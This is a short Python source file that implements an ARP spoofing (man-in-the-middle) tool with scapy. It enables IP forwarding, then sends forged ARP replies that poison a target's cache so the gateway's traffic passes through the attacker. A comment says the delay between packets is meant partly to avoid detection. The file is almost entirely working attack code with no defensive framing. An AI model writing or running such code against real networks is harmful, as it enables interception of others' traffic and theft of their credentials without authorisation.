from time import sleep
from scapy.all import ARP, send
from scapy.layers.l2 import getmacbyip

class arpPoison:
    def __init__(self):
        pass

    # Needed for routing capabilities, defaults to 0 on reboot
    def setup():
        file = open("/proc/sys/net/ipv4/ip_forward", "w")
        file.write("1")
        file.close()

    def poison(gatewayIP, targetIP):
            spoofPacket = ARP(pdst = targetIP, psrc = gatewayIP, hwdst = getmacbyip(targetIP), op = 2)
            send(spoofPacket, verbose = 0)
            # Stops for 10 seconds to prevent network congestion, alongside a small delay to prevent obvious detection
            sleep(10)